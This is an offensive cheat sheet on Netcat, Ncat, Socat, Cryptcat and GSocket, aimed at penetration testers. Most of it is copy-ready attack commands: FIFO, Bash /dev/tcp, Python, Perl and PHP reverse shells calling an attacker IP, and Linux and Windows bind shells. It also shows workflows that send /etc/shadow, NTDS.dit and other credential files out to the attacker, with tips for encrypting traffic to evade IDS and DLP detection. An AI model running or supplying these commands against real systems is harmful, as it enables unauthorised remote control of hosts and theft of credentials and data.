Netcat & Ncat

The indispensable networking utility for reading and writing data streams across TCP and UDP sockets. Master persistent listeners, reliable FIFO reverse shells, bind shell architecture, encrypted Ncat SSL tunnels, interactive TTY upgrades, and Socat relays.

Reverse Shell Bind Shell Ncat SSL FIFO Pipeline TTY Upgrade File Transfer Banner Grabbing Socat
First 3 Commands — Quick Start
The core listener and reverse shell commands covering 90% of offensive engagements.
$ nc -lvnp 4444 Start TCP listener
$ ncat -lvnp 4444 --keep-open Persistent ncat listener
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f Reliable FIFO reverse shell
Why is my reverse shell dead? — The -e flag, firewalls, and TTY traps.
  • The -e flag is often removed: OpenBSD Netcat (shipped by default on Debian, Ubuntu, and macOS) deliberately disables -e and -c for security hardening. Running nc -e /bin/bash will fail silently or abort with invalid option -- 'e'. Use modern Ncat (ncat -e), a named FIFO pipeline (mkfifo), or language one-liners (Bash, Python, Perl) instead.
  • Bind shells are blocked by egress firewalls: A bind shell requires the target host to open a listening port and the attacker to connect inbound. Modern corporate perimeter firewalls and cloud NAT gateways block unsolicited inbound connections. If you need a bind shell, ensure the target firewall allows the port, or stick to outbound reverse shells.
  • Plain Netcat shells lack job control and TTY: Pressing Ctrl+C or Ctrl+Z in a raw Netcat connection kills your remote session instantly. Arrows produce escape codes (^[[A) and Tab autocompletion fails. Always upgrade to a fully interactive PTY immediately after catching a shell.
  • Encrypted traffic is not native: Standard Netcat sends everything over cleartext TCP. Transmitting interactive root commands, passwords, or exfiltrated files exposes raw credentials to any network sniffer or IDS. Use Ncat with --ssl or Socat for encrypted channels.
Netcat is a family, not a single tool. The command nc points to different implementations depending on your environment. OpenBSD Netcat (Debian/Ubuntu/macOS) emphasizes minimalism and omits -e. Ncat (from the Nmap project) is the modern gold standard featuring native SSL/TLS encryption, connection brokering, persistent multi-client listening (--keep-open), and host access control lists. GNU Netcat is an older legacy build. Always verify which binary you are invoking with nc -h or ncat -h before assuming a specific flag is supported.

Listeners & Connections

Standard TCP listeners & connecting
Open a listening socket to catch reverse shells or connect to a remote TCP endpoint.
$ nc -lvnp 4444 Traditional OpenBSD/GNU netcat TCP listener
$ ncat -lvnp 4444 Modern Ncat listener (Nmap project)
$ nc 10.10.10.1 4444 Connect directly to target TCP host and port
Persistent listener (Ncat only: --keep-open)
Keeps the listening socket active across multiple sequential connections without terminating on disconnect.
$ ncat -lvnp 4444 --keep-open Crucial: stays open after shell disconnects
$ ncat -lvnp 4444 -k Short flag alias for --keep-open
UDP socket listener & transmission
Listen for incoming datagrams or exfiltrate data past firewalls that permit outbound UDP.
$ nc -lunvp 4444 Listen on UDP port 4444
$ nc -u 10.10.10.1 4444 Send UDP datagrams to target host
Encrypted SSL/TLS listener (Ncat only: --ssl)
Prevent cleartext payload inspection and evade network intrusion detection systems.
$ ncat -lvnp 4444 --ssl Generate on-the-fly TLS cert and listen securely
$ ncat --ssl 10.10.14.5 4444 Connect to SSL listener over encrypted channel
Critical TLS Requirement: Both sides must use --ssl. Connecting with plain nc or a Bash /dev/tcp shell to an Ncat SSL listener will produce silence — the shell connects, but because cleartext shells do not negotiate TLS, the handshake never completes and no prompt will appear.

Reverse Shells & TTY Upgrade

Bash native reverse shell (/dev/tcp)
Pure Bash execution without needing Netcat or external binaries installed on the target.
$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 Most reliable Linux reverse shell
Named FIFO pipeline reverse shell (Universal Netcat)
The bulletproof Netcat technique that works on OpenBSD Netcat when -e is absent or disabled.
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f Single-line executable FIFO shell
Language-specific one-liners (Python, Perl, PHP, Ruby)
Execute interactive socket connections through available target runtime interpreters.
$ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' Python 3 socket reverse shell
$ perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' Perl socket reverse shell
$ php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");' PHP CLI reverse shell
Full TTY terminal upgrade (Step-by-step)
Transform a dumb, raw Netcat reverse shell into a fully interactive PTY with job control, Tab-completion, and editor support.
Step 1 target$ python3 -c 'import pty; pty.spawn("/bin/bash")' Spawn remote PTY on target
Step 2 attacker$ Ctrl+Z Send Netcat process to attacker background
Step 3 attacker$ stty raw -echo; fg Enable raw terminal mode and return to shell
Step 4 target$ reset Re-initialize terminal capability
Step 5 target$ export TERM=xterm-256color && export SHELL=bash Set 256-color terminal and shell environment
Step 6 target$ stty rows <rows> columns <cols> Replace with dimensions from attacker 'stty size'
Dimension Calibration: Run stty size in your local attacker terminal to view your current rows and columns (e.g. 42 160), then replace <rows> and <cols> with your dimensions so full-screen text editors (nano, vim) render without display corruption.

Bind Shells (Inbound Target Control)

Linux bind shell listeners
Target opens a listening port and waits for the attacker to connect inbound.
target$ nc -lvnp 4444 -e /bin/bash Requires netcat with -e enabled
target$ rm -f /tmp/b; mkfifo /tmp/b && cat /tmp/b | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/b FIFO bind shell when -e is unavailable
target$ ncat -lvnp 4444 -e /bin/bash --ssl Encrypted SSL Linux bind shell
Windows bind shell listeners
Bind cmd.exe or PowerShell to a listening TCP socket on a compromised Windows host.
C:\> nc.exe -lvnp 4444 -e cmd.exe Spawns cmd.exe upon connection
C:\> ncat.exe -lvnp 4444 -e powershell.exe --ssl Encrypted PowerShell bind shell
Connecting to a remote bind shell
Initiate an inbound connection from the attacker machine to the listening target port.
attacker$ nc 10.10.10.1 4444 Connect to unencrypted target bind shell
attacker$ ncat --ssl 10.10.10.1 4444 Connect to SSL-encrypted target bind shell

File Transfer & Exfiltration

Cleartext file transfer (Standard redirection)
Stream binary files or archives across a raw TCP socket until EOF is reached.
Workflow: Push file from attacker to target
target$ nc -lvnp 9999 > received_tool.elf 1. Target starts listener waiting for bytes
attacker$ nc 10.10.10.1 9999 < local_tool.elf 2. Attacker transmits file contents and sends EOF
Workflow: Exfiltrate data from target to attacker
attacker$ nc -lvnp 9999 > loot_passwords.txt 1. Attacker receives exfiltrated data stream
target$ nc 10.10.14.5 9999 < /etc/shadow 2. Target sends sensitive file outbound
Encrypted file exfiltration (Ncat only: --ssl)
Transfer sensitive archives, NTDS.dit files, and credentials without revealing data in transit.
attacker$ ncat --ssl -lvnp 9999 > confidential_backup.tar.gz Encrypted SSL receiver
target$ ncat --ssl 10.10.14.5 9999 < sensitive_backup.tar.gz Encrypted SSL sender
OPSEC Rule: Always use SSL encryption when transferring password hashes, SAM files, memory dumps, or customer PII. Cleartext Netcat transfers will trip network DLP sensors and trigger incident response.

Scanning & Banner Grabbing

Netcat is not a full port scanner. Netcat lacks Nmap's service fingerprinting, OS detection engine, NSE scripting engine, and adaptive timing. Use Netcat exclusively for targeted single-port checks, firewall rule verification, and raw banner grabbing — not for large subnet auditing.
Banner grabbing with timeout (-w)
Inspect raw service identification strings without hanging indefinitely on filtered or silent ports.
$ nc -w 3 10.10.10.1 22 Grab OpenSSH version banner with 3-second timeout
$ nc -w 3 10.10.10.1 21 Inspect FTP service banner
$ nc -w 3 10.10.10.1 25 Inspect SMTP mail exchange daemon banner
Manual HTTP service banner extraction
Send RFC-compliant HTTP requests directly through Netcat to inspect web server headers.
$ printf 'GET / HTTP/1.0\r\nHost: target.com\r\n\r\n' | nc -w 3 10.10.10.1 80 Fetch Server, Content-Type & Set-Cookie headers
Port range sanity check (Zero-I/O: -z)
Probe whether specific ports or small ranges accept connections without transmitting data.
$ nc -zvn 10.10.10.1 20-25 TCP port sweep across ports 20-25
$ nc -zvun 10.10.10.1 53 Test UDP DNS port connectivity
Output Filtering: The -v flag prints diagnostic lines for every probed port (both open and closed). For clean scripted scanning without terminal clutter, drop -v or filter output: nc -zvn 10.10.10.1 20-100 2>&1 | grep succeeded (or grep open on GNU netcat).

Modern Alternatives — Socat, Cryptcat & GSocket

Socat (Socket Cat — The bidirectional relay)
The most powerful Netcat replacement: allocates native interactive PTYs and relays connections. Install: sudo apt install -y socat (Kali usually has it pre-installed).
attacker$ socat file:`tty`,raw,echo=0 TCP-LISTEN:4444 Listener: spawns native interactive PTY immediately
target$ socat TCP:10.10.14.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane Reverse shell: full job control without Python upgrade
$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.1.10:80 Port forwarding: forward local 8080 to internal subnet host
Prerequisites: Install via sudo apt install -y socat (standard Kali Linux typically has it pre-installed).
Cryptcat (Twofish encrypted legacy socket)
Drop-in Netcat wrapper securing communications with Twofish symmetric stream encryption. Install: sudo apt install -y cryptcat
$ cryptcat -lvnp 4444 -k SecretEngagementPassword Encrypted listener with symmetric shared secret
$ cryptcat 10.10.14.5 4444 -k SecretEngagementPassword Connect to encrypted Cryptcat session
Prerequisites: Install via sudo apt install -y cryptcat.
GSocket (Global Socket — Tor & NAT traversal)
Encrypted connection brokering through Tor or Global Socket relay, bypassing firewalls and NAT without public IPs. Install: sh -c "$(curl -fsSL https://gsocket.io/y)"
target$ gs-netcat -s "MySecretEngagementKey" -i Target establishes outbound Tor rendezvous
attacker$ gs-netcat -s "MySecretEngagementKey" Attacker accesses interactive shell via shared key
Prerequisites: Install via sh -c "$(curl -fsSL https://gsocket.io/y)" (installs gs-netcat binary to ~/.gsocket/bin).
